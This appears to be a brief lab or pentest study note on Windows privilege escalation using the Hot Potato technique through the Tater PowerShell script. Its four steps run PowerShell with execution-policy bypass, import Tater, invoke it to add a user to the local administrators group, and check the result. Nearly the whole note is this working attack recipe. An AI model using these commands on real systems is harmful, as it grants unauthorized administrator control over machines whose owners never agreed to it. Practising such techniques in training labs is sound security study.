#Windows #PrivEsc #Potato #HotPotato #PowerShell #Tater 

## **Exploitation**

Windows VM

1. In command prompt type: `powershell.exe -nop -ep bypass`
2. In Power Shell prompt type: `Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1`
3. In Power Shell prompt type: `Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"`
4. To confirm that the attack was successful, in Power Shell prompt type: `net localgroup administrators`